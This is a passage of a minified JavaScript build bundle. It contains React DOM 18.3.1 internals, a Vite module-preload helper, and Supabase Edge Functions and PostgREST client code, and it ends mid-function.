u.componentDidCatch=="function"&&(Zr===null||!Zr.has(u))){t=dn(l,t),t=zh(r,t,1),r=Jr(r,t,1),t=Nt(),r!==null&&(Kn(r,1,t),Et(r,t));break}}r=r.return}}function Yx(t,r,l){var u=t.pingCache;u!==null&&u.delete(r),r=Nt(),t.pingedLanes|=t.suspendedLanes&l,nt===t&&(dt&l)===l&&(Ze===4||Ze===3&&(dt&130023424)===dt&&500>Qe()-oc?Ps(t,0):ic|=l),Et(t,r)}function Ff(t,r){r===0&&((t.mode&1)===0?r=1:(r=ti,ti<<=1,(ti&130023424)===0&&(ti=4194304)));var l=Nt();t=kr(t,r),t!==null&&(Kn(t,r,l),Et(t,l))}function Jx(t){var r=t.memoizedState,l=0;r!==null&&(l=r.retryLane),Ff(t,l)}function Xx(t,r){var l=0;switch(t.tag){case 13:var u=t.stateNode,h=t.memoizedState;h!==null&&(l=h.retryLane);break;case 19:u=t.stateNode;break;default:throw Error(s(314))}u!==null&&u.delete(r),Ff(t,l)}var _f;_f=function(t,r,l){if(t!==null)if(t.memoizedProps!==r.pendingProps||Ft.current)St=!0;else{if((t.lanes&l)===0&&(r.flags&128)===0)return St=!1,$x(t,r,l);St=(t.flags&131072)!==0}else St=!1,Ue&&(r.flags&1048576)!==0&&nh(r,Ni,r.index);switch(r.lanes=0,r.tag){case 2:var u=r.type;Mi(t,r),t=r.pendingProps;var h=tn(r,ut.current);ln(r,l),h=Ml(null,r,u,t,h,l);var g=$l();return r.flags|=1,typeof h=="object"&&h!==null&&typeof h.render=="function"&&h.$$typeof===void 0?(r.tag=1,r.memoizedState=null,r.updateQueue=null,_t(u)?(g=!0,yi(r)):g=!1,r.memoizedState=h.state!==null&&h.state!==void 0?h.state:null,Tl(r),h.updater=Oi,r.stateNode=h,h._reactInternals=r,Vl(r,u,t,l),r=Kl(null,r,u,!0,g,l)):(r.tag=0,Ue&&g&&wl(r),jt(null,r,h,l),r=r.child),r;case 16:u=r.elementType;e:{switch(Mi(t,r),t=r.pendingProps,h=u._init,u=h(u._payload),r.type=u,h=r.tag=eg(u),t=tr(u,t),h){case 0:r=Ql(null,r,u,t,l);break e;case 1:r=Jh(null,r,u,t,l);break e;case 11:r=Hh(null,r,u,t,l);break e;case 14:r=Gh(null,r,u,tr(u.type,t),l);break e}throw Error(s(306,u,""))}return r;case 0:return u=r.type,h=r.pendingProps,h=r.elementType===u?h:tr(u,h),Ql(t,r,u,h,l);case 1:return u=r.type,h=r.pendingProps,h=r.elementType===u?h:tr(u,h),Jh(t,r,u,h,l);case 3:e:{if(Xh(r),t===null)throw Error(s(387));u=r.pendingProps,g=r.memoizedState,h=g.element,fh(t,r),Ei(r,u,null,l);var y=r.memoizedState;if(u=y.element,g.isDehydrated)if(g={element:u,isDehydrated:!1,cache:y.cache,pendingSuspenseBoundaries:y.pendingSuspenseBoundaries,transitions:y.transitions},r.updateQueue.baseState=g,r.memoizedState=g,r.flags&256){h=dn(Error(s(423)),r),r=Zh(t,r,u,l,h);break e}else if(u!==h){h=dn(Error(s(424)),r),r=Zh(t,r,u,l,h);break e}else for(Lt=Hr(r.stateNode.containerInfo.firstChild),It=r,Ue=!0,er=null,l=uh(r,null,u,l),r.child=l;l;)l.flags=l.flags&-3|4096,l=l.sibling;else{if(nn(),u===h){r=_r(t,r,l);break e}jt(t,r,u,l)}r=r.child}return r;case 5:return xh(r),t===null&&kl(r),u=r.type,h=r.pendingProps,g=t!==null?t.memoizedProps:null,y=h.children,pl(u,h)?y=null:g!==null&&pl(u,g)&&(r.flags|=32),Yh(t,r),jt(t,r,y,l),r.child;case 6:return t===null&&kl(r),null;case 13:return ef(t,r,l);case 4:return Pl(r,r.stateNode.containerInfo),u=r.pendingProps,t===null?r.child=an(r,null,u,l):jt(t,r,u,l),r.child;case 11:return u=r.type,h=r.pendingProps,h=r.elementType===u?h:tr(u,h),Hh(t,r,u,h,l);case 7:return jt(t,r,r.pendingProps,l),r.child;case 8:return jt(t,r,r.pendingProps.children,l),r.child;case 12:return jt(t,r,r.pendingProps.children,l),r.child;case 10:e:{if(u=r.type._context,h=r.pendingProps,g=r.memoizedProps,y=h.value,De(_i,u._currentValue),u._currentValue=y,g!==null)if(Zt(g.value,y)){if(g.children===h.children&&!Ft.current){r=_r(t,r,l);break e}}else for(g=r.child,g!==null&&(g.return=r);g!==null;){var _=g.dependencies;if(_!==null){y=g.child;for(var A=_.firstContext;A!==null;){if(A.context===u){if(g.tag===1){A=Fr(-1,l&-l),A.tag=2;var $=g.updateQueue;if($!==null){$=$.shared;var J=$.pending;J===null?A.next=A:(A.next=J.next,J.next=A),$.pending=A}}g.lanes|=l,A=g.alternate,A!==null&&(A.lanes|=l),El(g.return,l,r),_.lanes|=l;break}A=A.next}}else if(g.tag===10)y=g.type===r.type?null:g.child;else if(g.tag===18){if(y=g.return,y===null)throw Error(s(341));y.lanes|=l,_=y.alternate,_!==null&&(_.lanes|=l),El(y,l,r),y=g.sibling}else y=g.child;if(y!==null)y.return=g;else for(y=g;y!==null;){if(y===r){y=null;break}if(g=y.sibling,g!==null){g.return=y.return,y=g;break}y=y.return}g=y}jt(t,r,h.children,l),r=r.child}return r;case 9:return h=r.type,u=r.pendingProps.children,ln(r,l),h=Ht(h),u=u(h),r.flags|=1,jt(t,r,u,l),r.child;case 14:return u=r.type,h=tr(u,r.pendingProps),h=tr(u.type,h),Gh(t,r,u,h,l);case 15:return Qh(t,r,r.type,r.pendingProps,l);case 17:return u=r.type,h=r.pendingProps,h=r.elementType===u?h:tr(u,h),Mi(t,r),r.tag=1,_t(u)?(t=!0,yi(r)):t=!1,ln(r,l),$h(r,u,h),Vl(r,u,h,l),Kl(null,r,u,!0,t,l);case 19:return rf(t,r,l);case 22:return Kh(t,r,l)}throw Error(s(156,r.tag))};function Sf(t,r){return au(t,r)}function Zx(t,r,l,u){this.tag=t,this.key=l,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=r,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=u,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function Kt(t,r,l,u){return new Zx(t,r,l,u)}function pc(t){return t=t.prototype,!(!t||!t.isReactComponent)}function eg(t){if(typeof t=="function")return pc(t)?1:0;if(t!=null){if(t=t.$$typeof,t===xe)return 11;if(t===fe)return 14}return 2}function ss(t,r){var l=t.alternate;return l===null?(l=Kt(t.tag,r,t.key,t.mode),l.elementType=t.elementType,l.type=t.type,l.stateNode=t.stateNode,l.alternate=t,t.alternate=l):(l.pendingProps=r,l.type=t.type,l.flags=0,l.subtreeFlags=0,l.deletions=null),l.flags=t.flags&14680064,l.childLanes=t.childLanes,l.lanes=t.lanes,l.child=t.child,l.memoizedProps=t.memoizedProps,l.memoizedState=t.memoizedState,l.updateQueue=t.updateQueue,r=t.dependencies,l.dependencies=r===null?null:{lanes:r.lanes,firstContext:r.firstContext},l.sibling=t.sibling,l.index=t.index,l.ref=t.ref,l}function Ki(t,r,l,u,h,g){var y=2;if(u=t,typeof t=="function")pc(t)&&(y=1);else if(typeof t=="string")y=5;else e:switch(t){case G:return Is(l.children,h,g,r);case O:y=8,h|=8;break;case V:return t=Kt(12,l,r,h|2),t.elementType=V,t.lanes=g,t;case ye:return t=Kt(13,l,r,h),t.elementType=ye,t.lanes=g,t;case ne:return t=Kt(19,l,r,h),t.elementType=ne,t.lanes=g,t;case ee:return Yi(l,h,g,r);default:if(typeof t=="object"&&t!==null)switch(t.$$typeof){case B:y=10;break e;case ae:y=9;break e;case xe:y=11;break e;case fe:y=14;break e;case ie:y=16,u=null;break e}throw Error(s(130,t==null?t:typeof t,""))}return r=Kt(y,l,r,h),r.elementType=t,r.type=u,r.lanes=g,r}function Is(t,r,l,u){return t=Kt(7,t,u,r),t.lanes=l,t}function Yi(t,r,l,u){return t=Kt(22,t,u,r),t.elementType=ee,t.lanes=l,t.stateNode={isHidden:!1},t}function xc(t,r,l){return t=Kt(6,t,null,r),t.lanes=l,t}function gc(t,r,l){return r=Kt(4,t.children!==null?t.children:[],t.key,r),r.lanes=l,r.stateNode={containerInfo:t.containerInfo,pendingChildren:null,implementation:t.implementation},r}function tg(t,r,l,u,h){this.tag=r,this.containerInfo=t,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=Wo(0),this.expirationTimes=Wo(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Wo(0),this.identifierPrefix=u,this.onRecoverableError=h,this.mutableSourceEagerHydrationData=null}function bc(t,r,l,u,h,g,y,_,A){return t=new tg(t,r,l,_,A),r===1?(r=1,g===!0&&(r|=8)):r=0,g=Kt(3,null,null,r),t.current=g,g.stateNode=t,g.memoizedState={element:u,isDehydrated:l,cache:null,transitions:null,pendingSuspenseBoundaries:null},Tl(g),t}function rg(t,r,l){var u=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:H,key:u==null?null:""+u,children:t,containerInfo:r,implementation:l}}function Af(t){if(!t)return Qr;t=t._reactInternals;e:{if(js(t)!==t||t.tag!==1)throw Error(s(170));var r=t;do{switch(r.tag){case 3:r=r.stateNode.context;break e;case 1:if(_t(r.type)){r=r.stateNode.__reactInternalMemoizedMergedChildContext;break e}}r=r.return}while(r!==null);throw Error(s(171))}if(t.tag===1){var l=t.type;if(_t(l))return th(t,l,r)}return r}function Ef(t,r,l,u,h,g,y,_,A){return t=bc(l,u,!0,t,h,g,y,_,A),t.context=Af(null),l=t.current,u=Nt(),h=ts(l),g=Fr(u,h),g.callback=r??null,Jr(l,g,h),t.current.lanes=h,Kn(t,h,u),Et(t,u),t}function Ji(t,r,l,u){var h=r.current,g=Nt(),y=ts(h);return l=Af(l),r.context===null?r.context=l:r.pendingContext=l,r=Fr(g,y),r.payload={element:t},u=u===void 0?null:u,u!==null&&(r.callback=u),t=Jr(h,r,y),t!==null&&(nr(t,h,y,g),Ai(t,h,y)),y}function Xi(t){return t=t.current,t.child?(t.child.tag===5,t.child.stateNode):null}function Cf(t,r){if(t=t.memoizedState,t!==null&&t.dehydrated!==null){var l=t.retryLane;t.retryLane=l!==0&&l<r?l:r}}function vc(t,r){Cf(t,r),(t=t.alternate)&&Cf(t,r)}function sg(){return null}var Tf=typeof reportError=="function"?reportError:function(t){console.error(t)};function yc(t){this._internalRoot=t}Zi.prototype.render=yc.prototype.render=function(t){var r=this._internalRoot;if(r===null)throw Error(s(409));Ji(t,r,null,null)},Zi.prototype.unmount=yc.prototype.unmount=function(){var t=this._internalRoot;if(t!==null){this._internalRoot=null;var r=t.containerInfo;Ts(function(){Ji(null,t,null,null)}),r[yr]=null}};function Zi(t){this._internalRoot=t}Zi.prototype.unstable_scheduleHydration=function(t){if(t){var r=fu();t={blockedOn:null,target:t,priority:r};for(var l=0;l<qr.length&&r!==0&&r<qr[l].priority;l++);qr.splice(l,0,t),l===0&&xu(t)}};function wc(t){return!(!t||t.nodeType!==1&&t.nodeType!==9&&t.nodeType!==11)}function eo(t){return!(!t||t.nodeType!==1&&t.nodeType!==9&&t.nodeType!==11&&(t.nodeType!==8||t.nodeValue!==" react-mount-point-unstable "))}function Pf(){}function ng(t,r,l,u,h){if(h){if(typeof u=="function"){var g=u;u=function(){var $=Xi(y);g.call($)}}var y=Ef(r,u,t,0,null,!1,!1,"",Pf);return t._reactRootContainer=y,t[yr]=y.current,ca(t.nodeType===8?t.parentNode:t),Ts(),y}for(;h=t.lastChild;)t.removeChild(h);if(typeof u=="function"){var _=u;u=function(){var $=Xi(A);_.call($)}}var A=bc(t,0,!1,null,null,!1,!1,"",Pf);return t._reactRootContainer=A,t[yr]=A.current,ca(t.nodeType===8?t.parentNode:t),Ts(function(){Ji(r,A,l,u)}),A}function to(t,r,l,u,h){var g=l._reactRootContainer;if(g){var y=g;if(typeof h=="function"){var _=h;h=function(){var A=Xi(y);_.call(A)}}Ji(r,y,t,h)}else y=ng(l,r,t,h,u);return Xi(y)}uu=function(t){switch(t.tag){case 3:var r=t.stateNode;if(r.current.memoizedState.isDehydrated){var l=Qn(r.pendingLanes);l!==0&&(Vo(r,l|1),Et(r,Qe()),(Ce&6)===0&&(fn=Qe()+500,Kr()))}break;case 13:Ts(function(){var u=kr(t,1);if(u!==null){var h=Nt();nr(u,t,1,h)}}),vc(t,1)}},Ho=function(t){if(t.tag===13){var r=kr(t,134217728);if(r!==null){var l=Nt();nr(r,t,134217728,l)}vc(t,134217728)}},hu=function(t){if(t.tag===13){var r=ts(t),l=kr(t,r);if(l!==null){var u=Nt();nr(l,t,r,u)}vc(t,r)}},fu=function(){return Re},mu=function(t,r){var l=Re;try{return Re=t,r()}finally{Re=l}},Mo=function(t,r,l){switch(r){case"input":if(Oe(t,l),r=l.name,l.type==="radio"&&r!=null){for(l=t;l.parentNode;)l=l.parentNode;for(l=l.querySelectorAll("input[name="+JSON.stringify(""+r)+'][type="radio"]'),r=0;r<l.length;r++){var u=l[r];if(u!==t&&u.form===t.form){var h=bi(u);if(!h)throw Error(s(90));rt(u),Oe(u,h)}}}break;case"textarea":qd(t,l);break;case"select":r=l.value,r!=null&&vr(t,!!l.multiple,r,!1)}},Xd=hc,Zd=Ts;var ag={usingClientEntryPoint:!1,Events:[ha,Zs,bi,Yd,Jd,hc]},_a={findFiberByHostInstance:Ns,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},ig={bundleType:_a.bundleType,version:_a.version,rendererPackageName:_a.rendererPackageName,rendererConfig:_a.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:U.ReactCurrentDispatcher,findHostInstanceByFiber:function(t){return t=su(t),t===null?null:t.stateNode},findFiberByHostInstance:_a.findFiberByHostInstance||sg,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var ro=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!ro.isDisabled&&ro.supportsFiber)try{Za=ro.inject(ig),dr=ro}catch{}}return Ct.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=ag,Ct.createPortal=function(t,r){var l=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!wc(r))throw Error(s(200));return rg(t,r,null,l)},Ct.createRoot=function(t,r){if(!wc(t))throw Error(s(299));var l=!1,u="",h=Tf;return r!=null&&(r.unstable_strictMode===!0&&(l=!0),r.identifierPrefix!==void 0&&(u=r.identifierPrefix),r.onRecoverableError!==void 0&&(h=r.onRecoverableError)),r=bc(t,1,!1,null,null,l,!1,u,h),t[yr]=r.current,ca(t.nodeType===8?t.parentNode:t),new yc(r)},Ct.findDOMNode=function(t){if(t==null)return null;if(t.nodeType===1)return t;var r=t._reactInternals;if(r===void 0)throw typeof t.render=="function"?Error(s(188)):(t=Object.keys(t).join(","),Error(s(268,t)));return t=su(r),t=t===null?null:t.stateNode,t},Ct.flushSync=function(t){return Ts(t)},Ct.hydrate=function(t,r,l){if(!eo(r))throw Error(s(200));return to(null,t,r,!0,l)},Ct.hydrateRoot=function(t,r,l){if(!wc(t))throw Error(s(405));var u=l!=null&&l.hydratedSources||null,h=!1,g="",y=Tf;if(l!=null&&(l.unstable_strictMode===!0&&(h=!0),l.identifierPrefix!==void 0&&(g=l.identifierPrefix),l.onRecoverableError!==void 0&&(y=l.onRecoverableError)),r=Ef(r,null,t,1,l??null,h,!1,g,y),t[yr]=r.current,ca(t),u)for(t=0;t<u.length;t++)l=u[t],h=l._getVersion,h=h(l._source),r.mutableSourceEagerHydrationData==null?r.mutableSourceEagerHydrationData=[l,h]:r.mutableSourceEagerHydrationData.push(l,h);return new Zi(r)},Ct.render=function(t,r,l){if(!eo(r))throw Error(s(200));return to(null,t,r,!1,l)},Ct.unmountComponentAtNode=function(t){if(!eo(t))throw Error(s(40));return t._reactRootContainer?(Ts(function(){to(null,null,t,!1,function(){t._reactRootContainer=null,t[yr]=null})}),!0):!1},Ct.unstable_batchedUpdates=hc,Ct.unstable_renderSubtreeIntoContainer=function(t,r,l,u){if(!eo(l))throw Error(s(200));if(t==null||t._reactInternals===void 0)throw Error(s(38));return to(t,r,l,!1,u)},Ct.version="18.3.1-next-f1338f8080-20240426",Ct}var Bf;function pg(){if(Bf)return kc.exports;Bf=1;function a(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(a)}catch(n){console.error(n)}}return a(),kc.exports=mg(),kc.exports}var Uf;function xg(){if(Uf)return so;Uf=1;var a=pg();return so.createRoot=a.createRoot,so.hydrateRoot=a.hydrateRoot,so}var gg=xg();const bg="modulepreload",vg=function(a){return"/"+a},zf={},pr=function(n,s,i){let o=Promise.resolve();if(s&&s.length>0){let f=function(x){return Promise.all(x.map(p=>Promise.resolve(p).then(b=>({status:"fulfilled",value:b}),b=>({status:"rejected",reason:b}))))};document.getElementsByTagName("link");const d=document.querySelector("meta[property=csp-nonce]"),m=d?.nonce||d?.getAttribute("nonce");o=f(s.map(x=>{if(x=vg(x),x in zf)return;zf[x]=!0;const p=x.endsWith(".css"),b=p?'[rel="stylesheet"]':"";if(document.querySelector(`link[href="${x}"]${b}`))return;const w=document.createElement("link");if(w.rel=p?"stylesheet":bg,p||(w.as="script"),w.crossOrigin="",w.href=x,m&&w.setAttribute("nonce",m),document.head.appendChild(w),p)return new Promise((j,N)=>{w.addEventListener("load",j),w.addEventListener("error",()=>N(new Error(`Unable to preload CSS for ${x}`)))})}))}function c(d){const m=new Event("vite:preloadError",{cancelable:!0});if(m.payload=d,window.dispatchEvent(m),!m.defaultPrevented)throw d}return o.then(d=>{for(const m of d||[])m.status==="rejected"&&c(m.reason);return n().catch(c)})},yg=a=>{let n;return a?n=a:typeof fetch>"u"?n=(...s)=>pr(async()=>{const{default:i}=await Promise.resolve().then(()=>On);return{default:i}},void 0).then(({default:i})=>i(...s)):n=fetch,(...s)=>n(...s)};class bd extends Error{constructor(n,s="FunctionsError",i){super(n),this.name=s,this.context=i}}class wg extends bd{constructor(n){super("Failed to send a request to the Edge Function","FunctionsFetchError",n)}}class qf extends bd{constructor(n){super("Relay Error invoking the Edge Function","FunctionsRelayError",n)}}class Wf extends bd{constructor(n){super("Edge Function returned a non-2xx status code","FunctionsHttpError",n)}}var Hc;(function(a){a.Any="any",a.ApNortheast1="ap-northeast-1",a.ApNortheast2="ap-northeast-2",a.ApSouth1="ap-south-1",a.ApSoutheast1="ap-southeast-1",a.ApSoutheast2="ap-southeast-2",a.CaCentral1="ca-central-1",a.EuCentral1="eu-central-1",a.EuWest1="eu-west-1",a.EuWest2="eu-west-2",a.EuWest3="eu-west-3",a.SaEast1="sa-east-1",a.UsEast1="us-east-1",a.UsWest1="us-west-1",a.UsWest2="us-west-2"})(Hc||(Hc={}));var jg=function(a,n,s,i){function o(c){return c instanceof s?c:new s(function(d){d(c)})}return new(s||(s=Promise))(function(c,d){function m(p){try{x(i.next(p))}catch(b){d(b)}}function f(p){try{x(i.throw(p))}catch(b){d(b)}}function x(p){p.done?c(p.value):o(p.value).then(m,f)}x((i=i.apply(a,n||[])).next())})};class Ng{constructor(n,{headers:s={},customFetch:i,region:o=Hc.Any}={}){this.url=n,this.headers=s,this.region=o,this.fetch=yg(i)}setAuth(n){this.headers.Authorization=`Bearer ${n}`}invoke(n,s={}){var i;return jg(this,void 0,void 0,function*(){try{const{headers:o,method:c,body:d}=s;let m={},{region:f}=s;f||(f=this.region);const x=new URL(`${this.url}/${n}`);f&&f!=="any"&&(m["x-region"]=f,x.searchParams.set("forceFunctionRegion",f));let p;d&&(o&&!Object.prototype.hasOwnProperty.call(o,"Content-Type")||!o)&&(typeof Blob<"u"&&d instanceof Blob||d instanceof ArrayBuffer?(m["Content-Type"]="application/octet-stream",p=d):typeof d=="string"?(m["Content-Type"]="text/plain",p=d):typeof FormData<"u"&&d instanceof FormData?p=d:(m["Content-Type"]="application/json",p=JSON.stringify(d)));const b=yield this.fetch(x.toString(),{method:c||"POST",headers:Object.assign(Object.assign(Object.assign({},m),this.headers),o),body:p}).catch(k=>{throw new wg(k)}),w=b.headers.get("x-relay-error");if(w&&w==="true")throw new qf(b);if(!b.ok)throw new Wf(b);let j=((i=b.headers.get("Content-Type"))!==null&&i!==void 0?i:"text/plain").split(";")[0].trim(),N;return j==="application/json"?N=yield b.json():j==="application/octet-stream"?N=yield b.blob():j==="text/event-stream"?N=b:j==="multipart/form-data"?N=yield b.formData():N=yield b.text(),{data:N,error:null,response:b}}catch(o){return{data:null,error:o,response:o instanceof Wf||o instanceof qf?o.context:void 0}}})}}var it={},pn={},xn={},gn={},bn={},vn={},kg=function(){if(typeof self<"u")return self;if(typeof window<"u")return window;if(typeof global<"u")return global;throw new Error("unable to locate global object")},Rn=kg();const Fg=Rn.fetch,Km=Rn.fetch.bind(Rn),Ym=Rn.Headers,_g=Rn.Request,Sg=Rn.Response,On=Object.freeze(Object.defineProperty({__proto__:null,Headers:Ym,Request:_g,Response:Sg,default:Km,fetch:Fg},Symbol.toStringTag,{value:"Module"})),Ag=lg(On);var no={},Vf;function Jm(){if(Vf)return no;Vf=1,Object.defineProperty(no,"__esModule",{value:!0});class a extends Error{constructor(s){super(s.message),this.name="PostgrestError",this.details=s.details,this.hint=s.hint,this.code=s.code}}return no.default=a,no}var Hf;function Xm(){if(Hf)return vn;Hf=1;var a=vn&&vn.__importDefault||function(o){return o&&o.__esModule?o:{default:o}};Object.defineProperty(vn,"__esModule",{value:!0});const n=a(Ag),s=a(Jm());class i{constructor(c){this.shouldThrowOnError=!1,this.method=c.method,this.url=c.url,this.headers=c.headers,this.schema=c.schema,this.body=c.body,this.shouldThrowOnError=c.shouldThrowOnError,this.signal=c.signal,this.isMaybeSingle=c.isMaybeSingle,c.fetch?this.fetch=c.fetch:typeof fetch>"u"?this.fetch=n.default:this.fetch=fetch}throwOnError(){return this.shouldThrowOnError=!0,this}setHeader(c,d){return this.headers=Object.assign({},this.headers),this.headers[c]=d,this}then(c,d){this.schema===void 0||(["GET","HEAD"].includes(this.method)?this.headers["Accept-Profile"]=this.schema:this.headers["Content-Profile"]=this.schema),this.method!=="GET"&&this.method!=="HEAD"&&(this.headers["Content-Type"]="application/json");const m=this.fetch;let f=m(this.url.toString(),{method:this.method,headers:this.headers,body:JSON.stringify(this.body),signal:this.signal}).then(async x=>{var p,b,w;let j=null,N=null,k=null,F=x.status,T=x.statusText;if(x.ok){if(this.method!=="HEAD"){const z=await x.text();z===""||(this.headers.Accept==="text/csv"||this.headers.Accept&&this.headers.Accept.includes("application/vnd.pgrst.plan+text")?N=z:N=JSON.parse(z))}const S=(p=this.headers.Prefer)===null||p===void 0?void 0:p.match(/count=(exact|planned|estimated)/),U=(b=x.headers.get("content-range"))===null||b===void 0?void 0:b.split("/");S&&U&&U.length>1&&(k=parseInt(U[1])),this.isMaybeSingle&&this.method==="GET"&&Array.isArray(N)&&(N.length>1?(j={code:"PGRST116",details:`Results contain ${N.length} rows, application/vnd.pgrst.object+json requires 1 row`,hint:null,message:"JSON object requested, multiple (or no) rows returned"},N=null,k=null,F=406,T="Not Acceptable"):N.length===1?N=N[0]:N=null)}else{const S=await x.text();try{j=JSON.parse(S),Array.isArray(j)&&x.status===404&&(N=[],j=null,F=200,T="OK")}catch{x.status===404&&S===""?(F=204,T="No Content"):j={message:S}}if(j&&this.isMaybeSingle&&(!((w=j?.details)===null||w===void 0)&&w.includes("0 rows"))&&(j=null,F=200,T="OK"),j&&this.shouldThrowOnError)throw new s.default(j)}return{error:j,data:N,count:k,status:F,statusText:T}});return this.shouldThrowOnError||(f=f.catch(x=>{var p,b,w;return{error:{message:`${(p=x?.name)!==null&&p!==void 0?p:"FetchError"}: ${x?.message}`,details:`${(b=x?.stack)!==null&&b!==void 0?b:""}`,hint:"",code:`${(w=x?.code)!==null&&w!==void 0?w:""}`},data:null,count:null,status:0,statusText:""}})),f.then(c,d)}returns(){return this}overrideTypes(){return this}}return vn.default=i,vn}var Gf;function Zm(){if(Gf)return bn;Gf=1;var a=bn&&bn.__importDefault||function(i){return i&&i.__esModule?i:{default:i}};Object.defineProperty(bn,"__esModule",{value:!0});const n=a(Xm());class s extends n.default{select(o){let c=!1;const d=(o??"*").split("").map(m=>/\s/.test(m)&&!c?"":(m==='"'&&(c=!c),m)).join("");return this.url.searchParams.set("select",d),this.headers.Prefer&&(this.headers.Prefer+=","),this.headers.Prefer+="return=representation",this}order(o,{ascending:c=!0,nullsFirst:d,foreignTable:m,referencedTable:f=m}={}){const x=f?`${f}.order`:"order",p=this.url.searchParams.get(x);return this.url.searchParams.set(x,`${p?`${p},`:""}${o}.${c?"asc":"desc"}${d===void 0?"":d?".nullsfirst":".nullslast"}`),this}limit(o,{foreignTable:c,referencedTable:d=c}={}){const m=typeof d>"u"?"limit":`${d}.limit`;return this.url.searchParams.set(m,`${o}`),this}range(o,c,{foreignTable:d,referencedTable:m=d}={}){const f=typeof m>"u"?"offset":`${m}.offset`,x=typeof m>"u"?"limit":`${m}.limit`;return this.url.searchParams.set(f,`${o}`),this.url.searchParams.set(x,`${c-o+1}`),this}abortSignal(o){return this.signal=o,this}single(){return this.headers.Accept="application/vnd.pgrst.object+json",this}maybeSingle(){return this.method==="GET"?this.headers.Accept="application/json":this.headers.Accept="application/vnd.pgrst.object+json",this.isMaybeSingle=!0,this}csv(){return this.headers.Accept="text/csv",this}geojson(){return this.headers.Accept="application/geo+json",this}explain({analyze:o=!1,verbose:c=!1,settings:d=!1,buffers:m=!1,wal:f=!1,format:x="text"}={}){var p;const b=[o?"analyze":null,c?"verbose":null,d?"settings":null,m?"buffers":null,f?"wal":null].filter(Boolean).join("|"),w=(p=this.headers.Accept)!==null&&p!==void 0?p:"application/json";return this.headers.Accept=`application/vnd.pgrst.plan+${x}; for="${w}"; options=${b};`,x==="json"?this:this}rollback(){var o;return((o=this.headers.Prefer)!==null&&o!==void 0?o:"").trim().length>0?this.headers.Prefer+=",tx=rollback":this.headers.Prefer="tx=rollback",this}returns(){return this}}return bn.default=s,bn}var Qf;function vd(){if(Qf)return gn;Qf=1;var a=gn&&gn.__importDefault||function(i){return i&&i.__esModule?i:{default:i}};Object.defineProperty(gn,"__esModule",{value:!0});const n=a(Zm());class s extends n.default{eq(o,c){return this.url.searchParams.append(o,`eq.${c}`),this}neq(o,c){return this.url.searchParams.append(o,`neq.${c}`),this}gt(o,c){return this.url.searchParams.append(o,`gt.${c}`),this}gte(o,c){return this.url.searchParams.append(o,`gte.${c}`),this}lt(o,c){return this.url.searchParams.append(o,`lt.${c}`),this}lte(o,c){return this.url.searchParams.append(o,`lte.${c}`),this}like(o,c){return this.url.searchParams.append(o,`like.${c}`),this}likeAllOf(o,c){return this.url.searchParams.append(o,`like(all).{${c.join(",")}}`),this}likeAnyOf(o,c){return this.url.searchParams.append(o,`like(any).{${c.join(",")}}`),this}ilike(o,c){return this.url.searchParams.append(o,`ilike.${c}`),this}ilikeAllOf(o,c){return this.url.searchParams.append(o,`ilike(all).{${c.join(",")}}`),this}ilikeAnyOf(o,c){return this.url.searchParams.append(o,`ilike(any).{${c.join(",")}}`),this}is(o,c){return this.url.searchParams.append(o,`is.${c}`),this}in(o,c){const d=Array.from(new Set(c)).map(m=>typeof m=="string"&&new RegExp("[,()]").test(m)?`"${m}"`:`${m}`).join(",");return this.url.searchParams.append(o,`in.(${d})`),this}contains(o,c){return typeof c=="string"?this.url.searchParams.append(o,`cs.${c}`):Array.isArray(c)?this.url.searchParams.append(o,`cs.{${c.join(",")}}`):this.url.searchParams.append(o,`cs.${JSON.stringify(c)}`),this}containedBy(o,c){return typeof c=="string"?this.url.searchParams.append(o,`cd.${c}`):Array.isArray(c)?this.url.searchParams.append(o,`cd.{${c.join(",")}}`):this.url.searchParams.append(o,`cd.${JSON.stringify(c)}`),this}rangeGt(o,c){return this.url.searchParams.append(o,`sr.${c}`),this}rangeGte(o,c){return this.url.searchParams.append(o,`nxl.${c}`),this}rangeLt(o,c){return this.url.searchParams.append(o,`sl.${c}`),this}rangeLte(o,c){return this.url.searchParams.append(o,`nxr.${c}`),this}rangeAdjacent(o,c){return this.url.searchParams.append(o,`adj.${c}`),this}overlaps(o,c){return typeof c=="string"?this.url.searchParams.append(o,`ov.${c}`):this.url.searchParams.append(o,`ov.{${c.join(",")}}`),this}textSearch(o,c,{config:d,type:m}={}){let f="";m==="plain"?f="pl":m==="phrase"?f="ph":m==="websearch"&&(f="w");const x=d===void 0?"":`(${d})`;return this.url.searchParams.append(o,`${f}fts${x}.${c}`),this}match(o){return Object.entries(o).forEach(([c,d])=>{this.url.searchParams.append(c,`eq.${d}`)}),this}not(o,c,d){return this.url.searchParams.append(o,`not.${c}.${d}`),this}or(o,{foreignTable:c,referencedTable:d=c}={}){const m=d?`${d}.or`:"or";return this.url.searchParams.append(m,`(${o})`),this}filter(o,c,d){return this.url.searchParams.append(o,`${c}.${d}`),this}}return gn.default=s,gn}var Kf;function e0(){if(Kf)return xn;Kf=1;var a=xn&&xn.__importDefault||function(i){return 